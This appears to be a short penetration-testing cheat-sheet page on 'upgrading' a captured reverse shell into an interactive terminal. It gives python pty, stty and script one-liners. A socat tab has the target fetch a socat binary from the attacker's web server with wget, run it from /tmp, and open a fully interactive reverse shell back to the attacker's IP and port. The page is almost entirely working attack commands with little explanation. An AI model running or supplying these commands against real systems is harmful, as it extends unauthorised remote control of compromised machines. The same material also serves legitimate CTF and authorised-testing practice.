---
title: "Upgrade Shell"
date: 2024-6-27
tags: ["Reverse Shell", "Shell", "Python", "Bash", "Sh", "Tty", "Socat"]
---

### Upgrade Shell

#### Check installed binaries

```console
which sh
```

```console
which bash
```

```console
which python3
```

```console
which python
```

{{< tab set1 tab1 active >}}python{{< /tab >}}
{{< tab set1 tab2 >}}socat{{< /tab >}}
{{< tab set1 tab3 >}}script{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```console
# Ctrl-Z to send the process to background, then
stty raw -echo; fg
```

```console
# After fg, press enter again, then
export TERM=xterm-256color
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Start a local http server
python3 -m http.server 80
```

```console
# In our local Linux machine
socat file:`tty`,raw,echo=0 tcp-listen:<LOCAL_PORT>
```

```console
# In target machine
wget -q http://<LOCAL_IP>/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LOCAL_IP>:<LOCAL_PORT>
```

```console
# In our local Linux machine
export TERM=xterm-256color
```

<small>*Ref: [Download socat](https://github.com/3ndG4me/socat)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
script -qc /bin/bash /dev/null
```

{{< /tabcontent >}}
